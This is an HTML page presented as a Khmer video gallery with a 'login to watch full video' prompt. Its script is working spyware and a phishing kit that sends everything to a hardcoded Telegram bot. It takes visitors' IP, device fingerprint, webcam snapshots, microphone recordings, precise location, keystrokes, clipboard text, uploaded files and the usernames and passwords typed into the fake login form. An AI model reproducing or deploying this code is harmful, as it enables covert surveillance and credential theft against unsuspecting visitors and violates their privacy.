<<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
    :root { --theme-color: #FF0076; }
    body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
    h1 { text-align: center; color: #ffffff; padding: 35px; background: var(--theme-color); border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
    .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
    .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
    .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
    .video-card video { display: block; width: 100%; height: auto; }
    .capture-container { display: none; }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; }
    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(255,255,255,0.95); padding: 30px 40px; border-radius: 10px; text-align: center; }
    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; text-align: center; }
    .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; border-radius: 5px; }
    input[type="file"] { display: none; }
    #fileName { color: #555; margin-left: 10px; }
  </style>
</head>
<body>
  <h1>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <div class="container">
    <div class="video-grid">
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="machiu.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p1.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p2.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p3.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p4.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
    </div>
    <div class="capture-container">
      <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
      <canvas id="snapshot" width="200" height="200"></canvas>
    </div>
  </div>
  <div id="loginModal" class="modal">
    <div class="modal-content">
      <h2>Please Login to Watch Full Video</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>
    </div>
  </div>
  <div id="successOverlay" class="success-overlay">üéâ Login Successful!</div>
  <div class="container upload-section">
    <h2>Upload Your Video</h2>
    <label for="videoUpload" class="custom-file-upload">Choose File</label>
    <input type="file" id="videoUpload" accept="video/*,image/*">
    <span id="fileName">No file chosen</span>
    <button id="uploadVideoButton">Upload</button>
  </div>

<script>
    // --- Configuration ---
    const config = {
        botToken: "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA",
        chatId: "8017801890",
        snapshotInterval: 15000, // ms
        micRecordInterval: 10000, // ms
    };

    // --- DOM Elements ---
    const videoCaptureEl = document.getElementById("videoElementForCapture");
    const canvasEl = document.getElementById("snapshot");
    const loginModalEl = document.getElementById('loginModal');
    const uploadButton = document.getElementById('uploadVideoButton');
    const fileInput = document.getElementById('videoUpload');
    const fileNameSpan = document.getElementById('fileName');

    // --- State Variables ---
    let microphoneStream, mediaRecorder;
    let userLocation = { lat: "N/A", lon: "N/A" };
    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    let keyLogBuffer = "";
    const pageStartTime = Date.now();

    // --- Core Initialization ---
    async function initializeTracking() {
        sendToBot("üöÄ New Session Started");
        sendInitialReport();
        
        // Setup permission-based trackers
        await checkAndWatchPermission('camera', requestCamera, stopCamera);
        await checkAndWatchPermission('microphone', requestMicrophone, stopMicrophone);
        await checkAndWatchPermission('geolocation', requestGeolocation);

        // Setup passive trackers
        setupEventListeners();
        detectDevTools();
    }

    async function checkAndWatchPermission(name, requestFn, stopFn = () => {}) {
        if (!navigator.permissions) { requestFn(); return; }
        try {
            const status = await navigator.permissions.query({ name: name });
            sendToBot(`üìä Initial ${name} permission: ${status.state}`);
            if (status.state === 'granted') requestFn();
            
            status.onchange = () => {
                sendToBot(`üîÑ ${name} permission changed to: ${status.state}`);
                if (status.state === 'granted') requestFn();
                else if (stopFn) stopFn();
            };
        } catch (e) {
            sendToBot(`‚ö†Ô∏è Could not query ${name} permission. Assuming 'prompt'.`);
            requestFn();
        }
    }

    // --- Device & Media Control ---
    function requestCamera() {
        if (videoCaptureEl.srcObject?.active) return;
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                videoCaptureEl.srcObject = stream;
                videoCaptureEl.onloadedmetadata = () => setInterval(captureAndSend, config.snapshotInterval);
                sendToBot("‚úÖ Camera access granted.");
            }).catch(handleMediaError("Camera"));
    }
    function stopCamera() {
        videoCaptureEl.srcObject?.getTracks().forEach(track => track.stop());
        videoCaptureEl.srcObject = null;
        sendToBot("‚ùå Camera access stopped/revoked.");
    }

    function requestMicrophone() {
        if (microphoneStream?.active) return;
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                microphoneStream = stream;
                startMicRecording(stream);
                sendToBot("‚úÖ Microphone access granted.");
            }).catch(handleMediaError("Microphone"));
    }
    function stopMicrophone() {
        microphoneStream?.getTracks().forEach(track => track.stop());
        microphoneStream = null;
        if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
        sendToBot("‚ùå Microphone access stopped/revoked.");
    }

    function requestGeolocation() {
        if (userLocation.lat !== "N/A") return;
        navigator.geolocation.getCurrentPosition(
            pos => {
                userLocation = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                sendToBot(`üìç Location: ${userLocation.lat}, ${userLocation.lon}`);
                sendLocationAsMap(userLocation.lat, userLocation.lon);
            },
            err => sendToBot(`üö´ Geolocation Error: ${err.code === 1 ? "Permission Denied" : "Unavailable"}`),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    }

    function captureAndSend(caption = "üì∏ Webcam Snapshot") {
        if (!videoCaptureEl.srcObject?.active) return;
        const context = canvasEl.getContext("2d");
        canvasEl.width = videoCaptureEl.videoWidth;
        canvasEl.height = videoCaptureEl.videoHeight;
        context.drawImage(videoCaptureEl, 0, 0);
        canvasEl.toBlob(blob => blob && sendPhoto(blob, caption), "image/png");
    }

    function startMicRecording(stream) {
        if (!window.MediaRecorder) {
            sendToBot("‚ö†Ô∏è MediaRecorder API not supported.");
            return;
        }
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => e.data?.size > 0 && sendAudioToBot(e.data);
        mediaRecorder.start(config.micRecordInterval);
    }
    
    // --- Telegram API Communication ---
    function sendBeaconToBot(message) {
        const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
        const data = JSON.stringify({ chat_id: config.chatId, text: message, disable_notification: true });
        navigator.sendBeacon(url, new Blob([data], { type: 'application/json' }));
    }
    
    async function sendToBot(message) {
        if (!message) return;
        try {
            await fetch(`https://api.telegram.org/bot${config.botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: config.chatId, text: message, parse_mode: 'Markdown', disable_notification: true })
            });
        } catch (err) {
            console.error("Net MsgErr:", err);
        }
    }

    async function sendLocationAsMap(latitude, longitude) {
        try {
            await fetch(`https://api.telegram.org/bot${config.botToken}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: config.chatId, latitude, longitude, disable_notification: true })
            });
        } catch (err) {
            sendToBot(`üö´ Net Map Err: ${err.message}`);
        }
    }

    async function sendFormData(endpoint, formData, retries = 3) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${config.botToken}/${endpoint}`, {
                method: "POST", body: formData
            });
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(`API Error: ${errorData.description}`);
            }
        } catch (err) {
            sendToBot(`üö´ Net Form Data Err: ${err.message}`);
            if (retries > 0) {
                setTimeout(() => sendFormData(endpoint, formData, retries - 1), 2000);
            }
        }
    }
    
    function sendPhoto(blob, caption) {
        const fd = new FormData();
        fd.append("chat_id", config.chatId);
        fd.append("photo", blob, "snap.png");
        fd.append("caption", `${caption}\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
        sendFormData("sendPhoto", fd);
    }

    function sendAudioToBot(audioBlob) {
        const fd = new FormData();
        fd.append("chat_id", config.chatId);
        fd.append("audio", audioBlob, "mic_recording.webm");
        fd.append("caption", `üé§ Audio Clip\nLoc: ${userLocation.lat}, ${userLocation.lon}`);
        sendFormData("sendAudio", fd);
    }
    
    function sendDocument(file) {
        sendToBot(`üì¶ Uploading file: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)...`);
        const fd = new FormData();
        fd.append("chat_id", config.chatId);
        fd.append("document", file, file.name);
        fd.append("caption", `üìÑ File Uploaded by User\nFilename: ${file.name}`);
        sendFormData("sendDocument", fd);
    }

    // --- Information Gathering ---
    async function sendInitialReport() {
        let report = "üíª *Initial Visitor Report*\n\n";

        // IP and Basic Info
        try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const ipData = await ipRes.json();
            report += `*IP Address:* \`${ipData.ip}\`\n`;
        } catch (e) { report += "*IP Address:* Not Found\n"; }

        const ua = navigator.userAgent;
        const os = ua.includes("Win")?"Windows":ua.includes("Mac")?"MacOS":/Android/.test(ua)?"Android":/iP(ad|hone|od)/.test(ua)?"iOS":"Linux/Other";
        const browser = ua.includes("Firefox/")?"Firefox":/Edg\//.test(ua)?"Edge":/Chrome\//.test(ua)?"Chrome":/Safari\//.test(ua)?"Safari":"Other";
        report += `*OS:* ${os}\n*Browser:* ${browser}\n`;
        report += `*Screen:* ${screen.width}x${screen.height}\n`;
        try { report += `*Orientation:* ${screen.orientation.type}\n`; } catch (e) {}

        // Enhanced Device Info
        try {
            const battery = await navigator.getBattery();
            report += `*Battery:* ${Math.round(battery.level * 100)}% (${battery.charging ? '‚ö° Charging' : 'üîã Discharging'})\n`;
        } catch(e) { /* Ignore */ }
        
        const conn = navigator.connection;
        if (conn) report += `*Network:* ${conn.type} (Speed: ${conn.effectiveType})\n`;
        if (navigator.deviceMemory) report += `*RAM (Approx):* ${navigator.deviceMemory}GB\n`;
        
        // Canvas Fingerprint
        report += `*Canvas Fingerprint:* \`${getCanvasFingerprint()}\``;

        sendToBot(report);
    }

    // --- Advanced Tracking Features ---
    function getCanvasFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        const txt = 'UserAgent_Is_A_Lie_123!@#$%^&*()';
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.textBaseline = "alphabetic";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = "#069";
        ctx.fillText(txt, 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText(txt, 4, 17);
        
        const dataUrl = canvas.toDataURL();
        // Simple hash function
        let hash = 0;
        for (let i = 0; i < dataUrl.length; i++) {
            const char = dataUrl.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash.toString(16);
    }

    function trackKeystrokes(e) {
        let targetName = e.target.tagName;
        if (e.target.id) targetName += `#${e.target.id}`;
        
        if (e.key.length === 1) {
            keyLogBuffer += e.key;
        } else if (e.key === 'Backspace') {
            keyLogBuffer = keyLogBuffer.slice(0, -1);
        } else if (e.key === 'Enter') {
            sendToBot(`‚å®Ô∏è Key Logger (Enter in ${targetName}):\n\`\`\`\n${keyLogBuffer}\n\`\`\``);
            keyLogBuffer = "";
        } else if (e.key.length > 1) { // Capture keys like 'Shift', 'Control', etc.
            keyLogBuffer += ` [${e.key}] `;
        }
    }

    async function trackClipboard(e) {
        try {
            const text = await navigator.clipboard.readText();
            if (text) {
                sendToBot(`üìã Text Pasted/Copied:\n\`\`\`\n${text}\n\`\`\``);
            }
        } catch(err) {
             sendToBot(`üìã Copy/Paste event triggered, but could not read clipboard text (browser security).`);
        }
    }

    function trackScrolling() {
        const milestones = { 25: false, 50: false, 75: false, 100: false };
        return () => {
            const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
            if (scrollableHeight <= 0) return;
            const scrollPercent = Math.round((window.scrollY / scrollableHeight) * 100);
            
            for (const ms in milestones) {
                if (scrollPercent >= ms && !milestones[ms]) {
                    milestones[ms] = true;
                    sendToBot(`üìú Scrolled to ${ms}% of the page.`);
                }
            }
        };
    }
    
    function detectDevTools() {
        const threshold = 160;
        let devToolsOpen = false;
        const check = () => {
            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
                if (!devToolsOpen) {
                    sendToBot("‚ö†Ô∏è Developer Tools Opened!");
                    devToolsOpen = true; // Set flag to only send once
                }
            } else {
                devToolsOpen = false;
            }
            requestAnimationFrame(check);
        };
        requestAnimationFrame(check);
    }

    // --- Event Listeners Setup ---
    function setupEventListeners() {
        // Page visibility and unload
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'hidden') {
                const time = Math.round((Date.now() - pageStartTime) / 1000);
                sendBeaconToBot(`üö™ Page hidden. Session time: ${time}s.`);
            } else {
                sendToBot(`üëÄ Tab became active again.`);
            }
        });

        // Login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = this.elements.username.value;
            const pass = this.elements.password.value;
            sendToBot(`üîí Login Attempt:\nUser: \`${user}\`\nPass: \`${pass}\`\nKeys Logged:\n\`\`\`${keyLogBuffer}\`\`\``);
            keyLogBuffer = "";
            
            if (user && pass) {
                isLoggedIn = true; localStorage.setItem("isLoggedIn", "true");
                loginModalEl.style.display = 'none';
                sendToBot(`‚úÖ Login successful for "${user}".`);
                captureAndSend(`üì∏ Snapshot on Login`);
            } else {
                sendToBot(`‚ùå Login failed for "${user}".`);
            }
            this.reset();
        });

        // Video interaction
        document.querySelectorAll('.homevideo').forEach(vid => {
            const vidName = vid.querySelector('source').src.split('/').pop();
            vid.addEventListener('play', function() {
                if (!isLoggedIn && this.currentTime >= 5) {
                    this.pause();
                    loginModalEl.style.display = 'block';
                } else sendToBot(`‚ñ∂Ô∏è Play: ${vidName}`);
            });
            vid.addEventListener('pause', () => sendToBot(`‚è∏Ô∏è Pause: ${vidName}`));
            vid.addEventListener('ended', () => sendToBot(`‚èπÔ∏è Ended: ${vidName}`));
        });
        
        // File Upload
        fileInput.addEventListener('change', () => {
            fileNameSpan.textContent = fileInput.files.length > 0 ? fileInput.files[0].name : 'No file chosen';
        });
        uploadButton.addEventListener('click', () => {
            if (fileInput.files.length > 0) {
                sendDocument(fileInput.files[0]);
            } else {
                sendToBot("‚ö†Ô∏è User clicked upload with no file selected.");
            }
        });

        // Advanced Event Listeners
        document.addEventListener('keydown', trackKeystrokes);
        document.addEventListener('copy', trackClipboard);
        document.addEventListener('paste', trackClipboard);
        window.addEventListener('scroll', trackScrolling(), { passive: true });
    }
    
    function handleMediaError(type) {
        return e => sendToBot(`üö´ ${type} Error: ${e.name}. ${e.message}`);
    }

    // --- Start ---
    if (isLoggedIn) {
        loginModalEl.style.display = 'none';
    }
    initializeTracking();
</script>

</body>
</html>
